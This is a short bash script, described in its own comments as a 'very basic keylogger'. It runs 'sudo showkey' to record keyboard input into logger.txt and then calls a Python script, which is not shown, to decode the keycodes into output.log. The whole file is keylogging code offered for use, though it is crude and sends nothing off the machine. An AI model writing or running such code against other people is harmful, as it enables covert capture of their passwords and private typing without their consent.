#!/bin/bash
# This is a very basic keylogger which takes input from keyboard using the showkey command 
# and stores the logs in logger.txt file


sudo showkey > ./logger.txt   # captures all the characters entered and stores in logger.txt file in coded form


python3 script.py         # runs the python script and decodes all the characters using logger.txt and keymaps.txt
						   # and stores the results in output.log
						   
